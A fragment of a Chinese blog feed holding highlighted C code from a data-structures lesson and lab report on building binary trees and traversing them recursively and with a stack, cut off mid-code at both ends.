class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-4-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.4.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.4.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-4-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.4.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.4.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-5-二叉树的创建"><a href="#1-5-二叉树的创建" class="headerlink" title="1.5 二叉树的创建"></a>1.5 二叉树的创建</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintree *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br></pre></td></tr></table></figure><h2 id="1-6-二叉树的遍历-—–-非递归实现"><a href="#1-6-二叉树的遍历-—–-非递归实现" class="headerlink" title="1.6 二叉树的遍历  —– 非递归实现"></a>1.6 二叉树的遍历  —– 非递归实现</h2><p>二叉树的 递归遍历 算法较简易，但是运行时间长，执行效率较低，下面是非递归算法实现二叉树的遍历。</p><p><strong>使用一个 <code>栈</code> 来进行回溯</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  <span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-6-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.6.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.6.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><ul><li><p>当访问完 根结点之后，紧接着该访问其左子树，但前提是必须先使 当前结点放于 栈中保存起来，便于之后 右子树的访问。</p></li><li><p>当栈中的元素位于栈顶即将出栈时，则意味着根结点和左子树已经访问完成，出栈之后即可进行右子树的访问。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-6-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.6.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.6.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><ul><li><p>首先访问 左子树，但由于此时 根结点和 右子树都未进行访问，则 需要将其 先放入栈中保存起来，以便之后对根结点和右子树的访问。</p></li><li><p>当栈中元素位于栈顶即将出栈时，即意味着其左子树已经访问完成，出栈后 则可 进行根结点和右子树的访问。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-6-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-6-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.6.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.6.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><ul><li><p>首先进行左子树的访问，同样需要将其先保存在栈中，便于之后对其 右子树以及根节点的访问。</p></li><li><p>需要使用 <code>seqstack类型  中的  数组 tag</code> ，其每个元素的值为0 或 1，用于标识栈中每个元素的状态。</p><p>当一个元素刚刚进栈时，当它第一次位于栈顶即将被处理时，其 tag 值为 0，意味着它的 右子树还没有进行访问，则接下来就应该访问它的 右子树，该元素仍旧在栈中，然后将其 tag 值改为 1，意味着此时其 右子树已经访问完成，当其第二次出现在栈顶即将被处理时，则意味着接下来应该访问它本身，即根结点，并将其出栈。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>数据结构第二次实验-二叉树的遍历（递归、非递归）</title>
    <link href="https://xizhi-future.github.io/2021/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%EF%BC%88%E9%80%92%E5%BD%92%E3%80%81%E9%9D%9E%E9%80%92%E5%BD%92%EF%BC%89/"/>
    <id>https://xizhi-future.github.io/2021/11/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86%EF%BC%88%E9%80%92%E5%BD%92%E3%80%81%E9%9D%9E%E9%80%92%E5%BD%92%EF%BC%89/</id>
    <published>2021-11-13T00:59:50.000Z</published>
    <updated>2021-11-13T01:00:31.607Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/11/P5kz2rRZslSJpCy.png" alt="image-20211111231233214"></p><p><strong>头文件 <code>bintree.h</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的存储：链式存储（不带双亲）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;<span class="comment">//定义结点类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span> <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;  <span class="comment">//根结点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二叉树的创建：按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历算法------递归算法-----------------------------------</span></span><br><span class="line"><span class="comment">//前序遍历（根 左 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历（左 根 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历（左 右 根）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree t)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  <span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历算法------非递归算法-----------------------------------</span></span><br><span class="line"><span class="comment">//前序遍历（根 左 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历（左 根 右）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历（左 右 根）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>源文件 <code>test.cpp</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------菜单界面--------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; \t1.递归遍历             2.非递归遍历       \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------0.退出----------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> select;</span><br><span class="line">    bintree t;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请根据前序遍历结果输入二叉树的 结点值（空子树使用 # 代替）：\n&quot;</span>);</span><br><span class="line">t = createbintree();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">Menu();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入菜单选项：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line"><span class="keyword">switch</span>(select)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//递归遍历</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;前序遍历结果：&quot;</span>);</span><br><span class="line">preorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;中序遍历结果：&quot;</span>);</span><br><span class="line">inorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;后序遍历结果：&quot;</span>);</span><br><span class="line">postorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//递归遍历</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;前序遍历结果：&quot;</span>);</span><br><span class="line">preorder(t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span 